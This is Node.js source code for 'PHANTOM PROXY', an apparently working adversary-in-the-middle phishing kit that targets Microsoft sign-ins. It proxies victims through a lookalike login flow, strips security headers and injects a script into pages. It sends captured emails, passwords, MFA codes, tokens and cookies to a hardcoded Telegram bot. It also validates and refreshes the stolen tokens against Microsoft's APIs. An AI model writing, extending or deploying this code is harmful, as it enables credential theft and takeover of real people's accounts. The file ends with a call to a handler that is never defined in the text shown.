// ============================================================
// 🥔 PHANTOM PROXY v10.3 — FIXED SW REGISTRATION
// ============================================================
// 🔥 NO EXPRESS — pure Node.js
// ✅ All features + Service Worker injection
// ============================================================

const http = require("http");
const https = require("https");
const path = require("path");
const fs = require("fs");
const zlib = require("zlib");
const crypto = require("crypto");
const os = require("os");

// ── ✅ SAFE REQUIRE ──
let axios, AdmZip, WebSocket, FormData;
try { axios = require('axios'); } catch (e) { axios = null; }
try { AdmZip = require('adm-zip'); } catch (e) { AdmZip = null; }
try { WebSocket = require('ws'); } catch (e) { WebSocket = null; }
try { FormData = require('form-data'); } catch (e) { FormData = null; }

// ── ✅ TELEGRAM CONFIG ──
const BOT_TOKEN = '8711298262:AAELP6IgeU9AUk-ci8TUUrQKJOUcbj-tBuw';
const CHAT_ID = '7310383191';

// ── ✅ DASHBOARD AUTH ──
const DASHBOARD_USER = process.env.DASHBOARD_USER || 'svrpsdev';
const DASHBOARD_PASS = process.env.DASHBOARD_PASS || 'Cozysarps18!';

// ── ✅ CONSTANTS ──
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const REDIRECT_URL = "https://login.microsoftonline.com/";

const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};
const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};

const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "";
const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
const VISITS_LOG_FILE = path.join(VISITS_LOG_DIR, "visits.log");
const DEVICE_FLOWS_FILE = path.join(__dirname, "device_flows.json");
const PRT_STORAGE_FILE = path.join(__dirname, "prt_storage.json");

if (!fs.existsSync(LOGS_DIRECTORY)) fs.mkdirSync(LOGS_DIRECTORY, { recursive: true });
if (!fs.existsSync(VISITS_LOG_DIR)) fs.mkdirSync(VISITS_LOG_DIR, { recursive: true });

const LOG_FILE_STREAMS = {};
const VICTIM_SESSIONS = {};
let deviceFlows = [];
let prtStorage = { prts: [], lastScan: null };

// ── ✅ CACHE MANAGER ──
class CacheManager {
    constructor(ttl = 300000) {
        this.cache = new Map();
        this.ttl = ttl;
        this.hits = 0;
        this.misses = 0;
    }
    get(key) {
        const item = this.cache.get(key);
        if (!item) { this.misses++; return null; }
        if (Date.now() > item.expiry) { this.cache.delete(key); this.misses++; return null; }
        this.hits++; return item.value;
    }
    set(key, value, ttl = null) {
        const expiry = Date.now() + (ttl || this.ttl);
        this.cache.set(key, { value, expiry });
        return value;
    }
    clean() {
        const now = Date.now();
        for (const [key, item] of this.cache) {
            if (now > item.expiry) this.cache.delete(key);
        }
    }
}
global._cache = new CacheManager(300000);

// ── ✅ RETRY LOGIC ──
async function retry(fn, retries = 3, delay = 1000, backoff = 2) {
    let lastError;
    let currentDelay = delay;
    for (let attempt = 1; attempt <= retries; attempt++) {
        try { return await fn(); } catch (error) {
            lastError = error;
            if (attempt === retries) break;
            const jitter = Math.random() * 0.3 + 0.85;
            await new Promise(resolve => setTimeout(resolve, currentDelay * jitter));
            currentDelay *= backoff;
        }
    }
    throw lastError;
}

// ── ✅ USER-AGENT ROTATION ──
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
];
function getRandomUserAgent() { return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]; }
function getAxiosConfig() { return { timeout: 10000, headers: { 'User-Agent': getRandomUserAgent() } }; }

// ============================================================
// 📤 TELEGRAM EXFILTRATION
// ============================================================
async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
    if (!tokens || Object.keys(tokens).length === 0 || !FormData) return;
    try {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `tokens_${sessionId}_${timestamp}.txt`;
        const filePath = path.join(os.tmpdir(), filename);
        let content = '# 🔑 FULL TOKENS DUMP\n';
        content += `# Session: ${sessionId}\n# Time: ${new Date().toISOString()}\n# Email: ${email || 'N/A'}\n# Password: ${password || 'N/A'}\n# MFA: ${mfaCode || 'N/A'}\n\n`;
        for (const [key, val] of Object.entries(tokens)) {
            if (val) content += `${key.toUpperCase()}:\n${val}\n\n`;
        }
        fs.writeFileSync(filePath, content);
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(filePath), { filename });
        form.append('caption', `🔑 Tokens file: ${filename}`);
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders(),
            timeout: 10000
        });
        try { fs.unlinkSync(filePath); } catch (e) {}
        console.log(`📤 Tokens file sent to Telegram for session ${sessionId}`);
    } catch (e) { console.error('Telegram tokens file failed:', e.message); }
}

async function sendCookiesFile(cookies, sessionId) {
    if (!cookies || Object.keys(cookies).length === 0 || !FormData) return;
    try {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `cookies_${sessionId}_${timestamp}.txt`;
        const filePath = path.join(os.tmpdir(), filename);
        let content = '# 🍪 COOKIES DUMP\n';
        for (const [name, value] of Object.entries(cookies)) content += `${name}=${value}\n`;
        fs.writeFileSync(filePath, content);
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(filePath), { filename });
        form.append('caption', `🍪 Cookies: ${filename}`);
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders(),
            timeout: 10000
        });
        try { fs.unlinkSync(filePath); } catch (e) {}
        console.log(`🍪 Cookies file sent to Telegram for session ${sessionId}`);
    } catch (e) { console.error('Telegram cookies file failed:', e.message); }
}

async function sendToTelegram(data) {
    if (!axios) {
        console.error('❌ axios not available, cannot send Telegram.');
        return;
    }
    try {
        const sessionId = data.sessionId || 'unknown';
        const email = data.email || 'N/A';
        const password = data.password || 'N/A';
        const mfa = data.mfa || 'N/A';
        const tokens = data.tokens || {};
        const cookies = data.cookies || {};

        console.log(`📤 Sending Telegram for session ${sessionId}: email=${email}, password=${password ? '***' : 'N/A'}, tokens=${Object.keys(tokens).length}, cookies=${Object.keys(cookies).length}`);

        let message = `🔐 **LOGIN CAPTURED!**\n\n👤 Email: ${email}\n🔐 Password: ${password}\n📱 MFA: ${mfa}\n🆔 Session: ${sessionId}\n🕒 Time: ${new Date().toISOString()}`;
        if (Object.keys(tokens).length > 0) {
            message += '\n\n🔑 Tokens:\n';
            for (const [k, v] of Object.entries(tokens)) message += `${k}: ${v.slice(0, 30)}...\n`;
            await sendTokensFile(tokens, sessionId, email, password, mfa);
        }
        if (Object.keys(cookies).length > 0) {
            message += '\n🍪 Cookies:\n';
            for (const [k, v] of Object.entries(cookies)) message += `${k}: ${v.slice(0, 30)}...\n`;
            await sendCookiesFile(cookies, sessionId);
        }
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        }, { timeout: 5000 });
        console.log(`✅ Telegram exfil for session ${sessionId} — response:`, response.status);
    } catch (e) {
        console.error('❌ Telegram send failed:', e.message);
        if (e.response) console.error('   Response data:', e.response.data);
    }
}

// ============================================================
// 🧩 PROXY HELPERS
// ============================================================
function getUserSession(requestCookies) {
    if (!requestCookies) return;
    const cookies = requestCookies.split("; ");
    for (const cookie of cookies) {
        const [name, ...val] = cookie.split("=");
        if (VICTIM_SESSIONS[name] && VICTIM_SESSIONS[name].value === val.join("=")) return name;
    }
    return;
}

function generateRandomString(length) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

function createSessionLogFile(logFilename, currentSession) {
    const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
    const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });
    LOG_FILE_STREAMS[currentSession] = logFileStream;
}

function generateNewSession(phishedURL) {
    const cookieName = generateRandomString(12);
    const cookieValue = generateRandomString(32);
    VICTIM_SESSIONS[cookieName] = {
        value: cookieValue,
        cookies: [],
        protocol: phishedURL.protocol,
        hostname: phishedURL.hostname,
        path: phishedURL.pathname + phishedURL.search,
        port: phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80),
        host: phishedURL.host,
        logFilename: `${phishedURL.host}__${new Date().toISOString()}.log`
    };
    createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
    return { cookieName, cookieValue };
}

function displayError(message, error, ...args) {
    console.error("******************************");
    console.error(`${message}: ${error.name || error}`);
    console.error(`Message: ${error.message}`);
    for (let i = 0; i < args.length; i++) console.error(`Parameter ${i + 1}: ${args[i]}`);
    console.error("******************************");
}

async function encryptData(data) {
    const iv = crypto.randomBytes(16);
    return new Promise((resolve, reject) => {
        const cipher = crypto.createCipheriv("aes-256-ctr", ENCRYPTION_KEY, iv);
        const encryptedData = [];
        cipher.on("error", reject)
              .on("data", chunk => encryptedData.push(chunk))
              .on("end", () => resolve({ iv: iv.toString("hex"), encryptedData: Buffer.concat(encryptedData).toString("hex") }));
        cipher.write(data, "utf-8");
        cipher.end();
    });
}

async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession) {
    const transaction = {
        timestamp: new Date().toISOString(),
        proxyRequestURL: `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`,
        proxyRequestMethod: proxyRequestOptions.method,
        proxyRequestHeaders: proxyRequestOptions.headers,
        proxyRequestBody: proxyRequestBody,
        proxyResponseStatusCode: proxyResponse.statusCode,
        proxyResponseHeaders: proxyResponse.headers
    };
    const logFileStream = LOG_FILE_STREAMS[currentSession];
    const encrypted = await encryptData(JSON.stringify(transaction));
    if (!logFileStream.write(`${JSON.stringify({ [encrypted.iv]: encrypted.encryptedData })}\n`)) {
        await new Promise(resolve => logFileStream.once("drain", resolve));
    }
}

// ── Cookie management (unchanged) ──
function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
    const sReq = requestHostname.split("."), sCookie = cookieDomain.split(".");
    if (sCookie.length < 2) return false;
    if (cookieHostOnly && sReq.length !== sCookie.length) return false;
    if (sReq.length < sCookie.length) return false;
    for (let i = 1; i < sCookie.length + 1; i++) if (sCookie.at(-i) !== sReq.at(-i)) return false;
    return true;
}

function isPathApplicable(requestPath, cookiePath) {
    const sReq = requestPath.split("/"), sCookie = cookiePath.split("/");
    if (cookiePath === "/") return true;
    if (sReq.length < sCookie.length) return false;
    for (let i = 1; i < sCookie.length; i++) if (sCookie[i] !== sReq[i]) return false;
    return true;
}

function isCookieApplicable(requestOptions, cookie) {
    return isDomainApplicable(requestOptions.hostname, cookie.domain, cookie.hostOnly) &&
           isPathApplicable(requestOptions.path, cookie.path);
}

function prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
    const cookieMap = {};
    const now = Date.now();
    for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
        if (!(now > cookie.expires) && isCookieApplicable(proxyRequestOptions, cookie)) {
            cookieMap[cookie.name] = cookie.value;
        }
    }
    return Object.entries(cookieMap).map(([n, v]) => `${n}=${v}`).join("; ");
}

function parseCookieDate(cookieDate) {
    let foundTime = false, foundDay = false, foundMonth = false, foundYear = false;
    let h, m, s, day, month, year;
    const tokens = cookieDate.split(/[\x09\x20-\x2F\x3B-\x40\x5B-\x60\x7B-\x7E]+/).filter(t => t);
    for (const token of tokens) {
        if (!foundTime) {
            const tm = /^(\d{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);
            if (tm) { foundTime = true; h = parseInt(tm[1]); m = parseInt(tm[2]); s = parseInt(tm[3]); continue; }
        }
        if (!foundDay) {
            const dm = /^(\d{1,2})(?:[^\d]|$)/.exec(token);
            if (dm) { foundDay = true; day = parseInt(dm[1]); continue; }
        }
        if (!foundMonth) {
            const months = ["jan","feb","mar","apr","may","jun","jul","aug","sep","oct","nov","dec"];
            for (let i = 0; i < months.length; i++) {
                if (token.toLowerCase().startsWith(months[i])) { foundMonth = true; month = i; break; }
            }
            if (foundMonth) continue;
        }
        if (!foundYear) {
            const ym = /^(\d{2,4})(?:[^\d]|$)/.exec(token);
            if (ym) { foundYear = true; year = parseInt(ym[1]); continue; }
        }
    }
    if (year >= 70 && year <= 99) year += 1900; else if (year >= 0 && year <= 69) year += 2000;
    if (!foundDay || !foundMonth || !foundYear || !foundTime) return NaN;
    if (day < 1 || day > 31 || year < 1601 || h > 23 || m > 59 || s > 59) return NaN;
    const d = new Date(Date.UTC(year, month, day, h, m, s));
    if (d.getUTCFullYear() !== year || d.getUTCMonth() !== month || d.getUTCDate() !== day) return NaN;
    return d.getTime();
}

function updateCurrentSessionCookies(request, newCookies, proxyHostname, currentSession, proxyResponseDate = null) {
    const pathNameMatch = request.path.match(/^\/[^?#]*(?=\/)/);
    const now = Date.now();
    let clockSkew = 0;
    if (proxyResponseDate) clockSkew = now - parseCookieDate(proxyResponseDate);
    for (const newCookie of newCookies) {
        const [cookie, ...attrs] = newCookie.split(";");
        const [cookieName, ...cookieVal] = cookie.split("=");
        let cookieDomain = request.hostname;
        let cookiePath = (pathNameMatch || ["/"])[0];
        let cookieExpires = NaN, cookieMaxAge = "", cookieHostOnly = true, isValid = true;
        for (const attr of attrs) {
            const a = attr.trim();
            const dm = a.match(/^domain\s*=(.*)$/i);
            const pm = a.match(/^path\s*=(.*)$/i);
            const em = a.match(/^expires\s*=(.*)$/i);
            const mm = a.match(/^max-age\s*=(.*)$/i);
            if (a.toLowerCase() === "domain") { cookieDomain = request.hostname; cookieHostOnly = true; isValid = true; }
            else if (a.toLowerCase() === "path") { cookiePath = (pathNameMatch || ["/"])[0]; }
            else if (a.toLowerCase() === "expires") { cookieExpires = NaN; }
            else if (a.toLowerCase() === "max-age") { cookieMaxAge = ""; }
            else if (dm) {
                cookieDomain = dm[1].replace(/^\./, "").trim(); cookieHostOnly = true; isValid = true;
                if (!cookieDomain) cookieDomain = request.hostname;
                else if (cookieDomain === proxyHostname) { cookieDomain = request.hostname; cookieHostOnly = false; }
                else if (cookieDomain !== request.hostname) {
                    if (isDomainApplicable(proxyHostname, cookieDomain, false)) {
                        cookieDomain = request.hostname.split(".").slice(-2).join(".");
                    } else if (!isDomainApplicable(request.hostname, cookieDomain, false)) { isValid = false; continue; }
                    cookieHostOnly = false;
                }
            } else if (pm) {
                cookiePath = pm[1].trim();
                if (!cookiePath.startsWith("/")) cookiePath = (pathNameMatch || ["/"])[0];
            } else if (em) {
                cookieExpires = parseCookieDate(em[1].trim());
            } else if (mm) {
                cookieMaxAge = mm[1].trim();
                if (!/^-?\d+$/.test(cookieMaxAge)) cookieMaxAge = "";
            }
        }
        if (!isValid) continue;
        cookieExpires += clockSkew;
        if (cookieMaxAge) { const sec = parseInt(cookieMaxAge); if (!isNaN(sec)) cookieExpires = now + sec * 1000; }
        let isNew = true;
        const sessionCookies = VICTIM_SESSIONS[currentSession].cookies;
        for (let i = 0; i < sessionCookies.length; i++) {
            const sc = sessionCookies[i];
            if (sc.name === cookieName && sc.domain === cookieDomain && sc.path === cookiePath && sc.hostOnly === cookieHostOnly) {
                if (now > cookieExpires) { sessionCookies.splice(i, 1); break; }
                sc.value = cookieVal.join("="); sc.expires = cookieExpires; isNew = false; break;
            }
        }
        if (isNew && !(now > cookieExpires)) {
            sessionCookies.push({ name: cookieName, value: cookieVal.join("="), domain: cookieDomain, path: cookiePath, expires: cookieExpires, hostOnly: cookieHostOnly });
        }
    }
}

function getValidDomains(domains) {
    const valid = [];
    for (const domain of domains) {
        const parts = domain.split(".");
        for (let i = 2; i < parts.length + 1; i++) {
            const d = parts.slice(-i).join(".");
            if (!valid.includes(d)) valid.push(d);
        }
    }
    return valid;
}

function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname) {
    const azureHeaders = ["max-forwards","x-arr-log-id","client-ip","disguised-host","x-site-deployment-id",
        "was-default-hostname","x-forwarded-proto","x-appservice-proto","x-arr-ssl","x-forwarded-tlsversion",
        "x-forwarded-for","x-original-url","x-waws-unencoded-url","x-client-ip","x-client-port"];
    const cookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession);
    if (cookies) proxyRequestOptions.headers.cookie = cookies;
    else delete proxyRequestOptions.headers.cookie;
    if (proxyRequestOptions.headers.origin) {
        proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}`;
    }
    if (proxyRequestOptions.headers.referer && proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT)) {
        delete proxyRequestOptions.headers.referer;
    }
    for (const [key, value] of Object.entries(proxyRequestOptions.headers)) {
        if (azureHeaders.includes(key)) delete proxyRequestOptions.headers[key];
        else proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VICTIM_SESSIONS[currentSession].host);
    }
}

function deleteHTTPSecurityResponseHeaders(headers) {
    const secHeaders = ["x-frame-options","x-xss-protection","x-content-type-options","set-cookie",
        "content-security-policy","content-security-policy-report-only","cross-origin-opener-policy",
        "cross-origin-embedder-policy","cross-origin-resource-policy","permissions-policy","service-worker-allowed"];
    for (const h of secHeaders) delete headers[h];
}

// ── Compression / injection ──
function decompressData(data, encoding) {
    const map = { gzip: zlib.gunzip, "x-gzip": zlib.gunzip, deflate: zlib.inflate, br: zlib.brotliDecompress, zstd: zlib.zstdDecompress };
    return new Promise((resolve, reject) => {
        const fn = map[encoding];
        if (fn) fn(data, (err, out) => err ? reject(err) : resolve(out));
        else resolve(data);
    });
}

function compressData(data, encoding) {
    const map = { gzip: zlib.gzip, "x-gzip": zlib.gzip, deflate: zlib.deflate, br: zlib.brotliCompress, zstd: zlib.zstdCompress };
    return new Promise((resolve, reject) => {
        const fn = map[encoding];
        if (fn) fn(data, (err, out) => err ? reject(err) : resolve(out));
        else resolve(data);
    });
}

async function decompressResponseBody(data, contentEncoding) {
    if (!contentEncoding) return { decompressedResponseBody: data, encodings: [] };
    const encodings = contentEncoding.split(",").map(e => e.trim().toLowerCase()).filter(e => e);
    let d = data;
    for (let i = encodings.length - 1; i >= 0; i--) d = await decompressData(d, encodings[i]);
    return { decompressedResponseBody: d, encodings };
}

async function compressResponseBody(data, encodings) {
    let d = data;
    for (const enc of encodings) d = await compressData(d, enc);
    return d;
}

function updateHTMLProxyResponse(body) {
    const payload = "<script src=/@></script>";
    const map = { "<head>": `<head>${payload}`, "<html>": `<html><head>${payload}</head>`, "<body>": `<head>${payload}</head><body>` };
    const limit = 200;
    for (const [key, val] of Object.entries(map)) {
        const tag = Buffer.from(key);
        const idx = body.subarray(0, limit).indexOf(tag);
        if (idx !== -1) return Buffer.concat([body.subarray(0, idx), Buffer.from(val), body.subarray(idx + tag.byteLength)]);
    }
    return Buffer.concat([Buffer.from(`<head>${payload}</head>`), body]);
}

function updateFederationRedirectUrl(body, proxyHostname) {
    try {
        const obj = JSON.parse(body.toString());
        const url = obj.Credentials.FederationRedirectUrl;
        const proxyUrl = new URL(`https://${proxyHostname}${PROXY_PATHNAMES.mutation}`);
        proxyUrl.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(url));
        obj.Credentials.FederationRedirectUrl = proxyUrl;
        return Buffer.from(JSON.stringify(obj));
    } catch (e) { return body; }
}

// ── Ensure HTML files exist ──
const indexFile = path.join(__dirname, PROXY_FILES.index);
const notFoundFile = path.join(__dirname, PROXY_FILES.notFound);
const scriptFile = path.join(__dirname, PROXY_FILES.script);
if (!fs.existsSync(indexFile)) {
    fs.writeFileSync(indexFile, `<!DOCTYPE html><html><head><title>Sign in</title></head><body><h1>Sign in</h1><form action="/capture" method="POST"><input name="email"><input name="password" type="password"><button>Next</button></form></body></html>`);
    console.log('✅ Created dummy index.html');
}
if (!fs.existsSync(notFoundFile)) {
    fs.writeFileSync(notFoundFile, '<h1>404 Not Found</h1>');
    console.log('✅ Created dummy 404.html');
}
if (!fs.existsSync(scriptFile)) {
    fs.writeFileSync(scriptFile, 'console.log("Service worker loaded");');
    console.log('✅ Created dummy script.js');
}

// ============================================================
// 📊 TOKEN VAULT CLASS
// ============================================================
class TokenVault {
    constructor(logsDir, encryptionKey) {
        this.logsDir = logsDir;
        this.encryptionKey = encryptionKey;
        this.tokens = [];
        this.scanLogs();
    }

    extractUsernameFromToken(token) {
        try {
            const parts = token.split('.');
            if (parts.length === 3) {
                const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
                return payload.email || payload.preferred_username || payload.upn || 'unknown';
            }
        } catch (e) {}
        return 'unknown';
    }

    scanLogs() {
        this.tokens = [];
        const files = fs.readdirSync(this.logsDir).filter(f => f.endsWith('.log'));
        for (const file of files) {
            try {
                const content = fs.readFileSync(path.join(this.logsDir, file), 'utf-8');
                const lines = content.split('\n').filter(line => line.trim());
                for (const line of lines) {
                    try {
                        const entry = JSON.parse(line);
                        const iv = Object.keys(entry)[0];
                        const encrypted = entry[iv];
                        const decipher = crypto.createDecipheriv('aes-256-ctr', this.encryptionKey, Buffer.from(iv, 'hex'));
                        let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                        decrypted = Buffer.concat([decrypted, decipher.final()]);
                        const obj = JSON.parse(decrypted.toString('utf-8'));
                        const body = obj.proxyRequestBody;
                        if (body) {
                            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                            const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
                            if (accessMatch) {
                                const token = decodeURIComponent(accessMatch[1]);
                                this.tokens.push({ type: 'access', value: token, file, username: this.extractUsernameFromToken(token), timestamp: new Date().toISOString() });
                            }
                            const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                            if (refreshMatch) {
                                const token = decodeURIComponent(refreshMatch[1]);
                                this.tokens.push({ type: 'refresh', value: token, file, username: this.extractUsernameFromToken(token), timestamp: new Date().toISOString() });
                            }
                            const idMatch = bodyStr.match(/id_token=([^&]+)/i);
                            if (idMatch) {
                                const token = decodeURIComponent(idMatch[1]);
                                this.tokens.push({ type: 'id', value: token, file, username: this.extractUsernameFromToken(token), timestamp: new Date().toISOString() });
                            }
                            const prtMatch = bodyStr.match(/prt=([^&]+)/i);
                            if (prtMatch) {
                                this.tokens.push({ type: 'prt', value: decodeURIComponent(prtMatch[1]), file, username: 'PRT', timestamp: new Date().toISOString() });
                            }
                        }
                    } catch (e) {}
                }
            } catch (e) {}
        }
        return this.tokens;
    }

    getStats() {
        return {
            total: this.tokens.length,
            access: this.tokens.filter(t => t.type === 'access').length,
            refresh: this.tokens.filter(t => t.type === 'refresh').length,
            id: this.tokens.filter(t => t.type === 'id').length,
            prt: this.tokens.filter(t => t.type === 'prt').length
        };
    }

    async healthCheckAll() {
        const results = [];
        const uniqueTokens = [];
        const seen = new Set();
        for (const token of this.tokens) {
            if (!seen.has(token.value) && token.type === 'access') {
                seen.add(token.value);
                uniqueTokens.push(token);
            }
        }
        for (const token of uniqueTokens.slice(0, 10)) {
            try {
                const response = await retry(async () => {
                    return await axios.get('https://graph.microsoft.com/v1.0/me', {
                        headers: { 'Authorization': `Bearer ${token.value}` },
                        timeout: 5000
                    });
                }, 2, 1000, 2);
                results.push({
                    token: token.value.slice(0, 20) + '...',
                    status: 'valid',
                    user: response.data.userPrincipalName,
                    username: token.username
                });
            } catch (e) {
                results.push({
                    token: token.value.slice(0, 20) + '...',
                    status: 'invalid',
                    error: e.message,
                    username: token.username
                });
            }
        }
        return results;
    }

    async exchangeToken(tokenValue) {
        try {
            const response = await retry(async () => {
                return await axios.post(
                    'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                    new URLSearchParams({
                        client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                        refresh_token: tokenValue,
                        grant_type: 'refresh_token',
                        scope: 'https://graph.microsoft.com/.default offline_access'
                    }),
                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
                );
            }, 3, 1000, 2);
            return response.data;
        } catch (err) {
            throw new Error(err.response?.data?.error_description || err.message);
        }
    }
}

const vault = new TokenVault(LOGS_DIRECTORY, ENCRYPTION_KEY);

// ============================================================
// 🔄 AUTO-REFRESH DAEMON
// ============================================================
async function refreshTokensDaemon() {
    console.log('🔄 Token Refresh Daemon started (every 30 min)');
    setInterval(async () => {
        for (const flow of deviceFlows) {
            if (flow.refresh_token && flow.status === 'approved') {
                try {
                    const response = await retry(async () => {
                        return await axios.post(
                            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                            new URLSearchParams({
                                client_id: flow.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                                refresh_token: flow.refresh_token,
                                grant_type: 'refresh_token',
                                scope: 'https://graph.microsoft.com/.default offline_access'
                            }),
                            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                        );
                    }, 2, 1000, 2);
                    flow.access_token = response.data.access_token;
                    if (response.data.refresh_token) flow.refresh_token = response.data.refresh_token;
                    flow.last_refresh = new Date().toISOString();
                    saveDeviceFlows();
                } catch (e) { console.warn(`Refresh failed: ${e.message}`); }
            }
        }
    }, 30 * 60 * 1000);
}

// ── Load device flows ──
function loadDeviceFlows() { try { if (fs.existsSync(DEVICE_FLOWS_FILE)) { deviceFlows = JSON.parse(fs.readFileSync(DEVICE_FLOWS_FILE, 'utf-8')); } } catch (e) {} }
function saveDeviceFlows() { try { fs.writeFileSync(DEVICE_FLOWS_FILE, JSON.stringify(deviceFlows, null, 2)); } catch (e) {} }
loadDeviceFlows();

// ── Load PRT storage ──
function loadPRTStorage() {
    try { if (fs.existsSync(PRT_STORAGE_FILE)) { prtStorage = JSON.parse(fs.readFileSync(PRT_STORAGE_FILE, 'utf-8')); } } catch (e) {}
}
function savePRTStorage() { try { fs.writeFileSync(PRT_STORAGE_FILE, JSON.stringify(prtStorage, null, 2)); } catch (e) {} }
loadPRTStorage();

// ── Graph API Client ──
class GraphClient {
    constructor(accessToken) {
        this.accessToken = accessToken;
        this.baseUrl = 'https://graph.microsoft.com/v1.0';
        this.cache = global._cache || new CacheManager();
    }
    async get(endpoint, useCache = true) {
        const cacheKey = `graph:get:${endpoint}`;
        if (useCache) {
            const cached = this.cache.get(cacheKey);
            if (cached) return cached;
        }
        const config = getAxiosConfig();
        config.headers['Authorization'] = `Bearer ${this.accessToken}`;
        const response = await retry(async () => {
            return await axios.get(`${this.baseUrl}${endpoint}`, config);
        }, 3, 1000, 2);
        if (useCache && response.status === 200) {
            this.cache.set(cacheKey, response.data, 300000);
        }
        return response.data;
    }
    async post(endpoint, data) {
        const config = getAxiosConfig();
        config.headers['Authorization'] = `Bearer ${this.accessToken}`;
        config.headers['Content-Type'] = 'application/json';
        const response = await retry(async () => {
            return await axios.post(`${this.baseUrl}${endpoint}`, data, config);
        }, 3, 1000, 2);
        return response.data;
    }
    async getUserProfile() {
        return this.get('/me?$select=id,displayName,mail,userPrincipalName,jobTitle,department,officeLocation,mobilePhone,businessPhones');
    }
}

// ============================================================
// 🛡️ DASHBOARD AUTH MIDDLEWARE
// ============================================================
function requireAuth(req, res) {
    const auth = req.headers.authorization;
    if (!auth) {
        res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="PHANTOM Dashboard"' });
        res.end();
        return false;
    }
    const base64 = auth.split(' ')[1];
    const [user, pass] = Buffer.from(base64, 'base64').toString().split(':');
    if (user === DASHBOARD_USER && pass === DASHBOARD_PASS) return true;
    res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="PHANTOM Dashboard"' });
    res.end();
    return false;
}

// ============================================================
// 🌐 MAIN PROXY SERVER
// ============================================================
const server = http.createServer(async (req, res) => {
    const { method, url } = req;

    // ── Dashboard HTML ──
    if (url === '/dash' || url === '/dash/') {
        if (!requireAuth(req, res)) return;
        const dashPath = path.join(__dirname, 'public', 'index.html');
        if (fs.existsSync(dashPath)) {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            fs.createReadStream(dashPath).pipe(res);
        } else {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(`<h1>PHANTOM Dashboard</h1><p>Place public/index.html in the same directory.</p>`);
        }
        return;
    }

    // ── Dashboard API ──
    if (url.startsWith('/api/') || url.startsWith('/dash/api/')) {
        if (!requireAuth(req, res)) return;
        await handleDashboardAPI(req, res);
        return;
    }

    // ── Device Code ──
    if (url === '/device' || url.startsWith('/device')) {
        if (!requireAuth(req, res)) return;
        const devicePath = path.join(__dirname, 'public', 'device_code.html');
        if (fs.existsSync(devicePath)) {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            fs.createReadStream(devicePath).pipe(res);
        } else {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(`<h1>Device Code</h1><p>Place public/device_code.html</p>`);
        }
        return;
    }

    // ── Proxy ──
    proxyHandler(req, res);
});

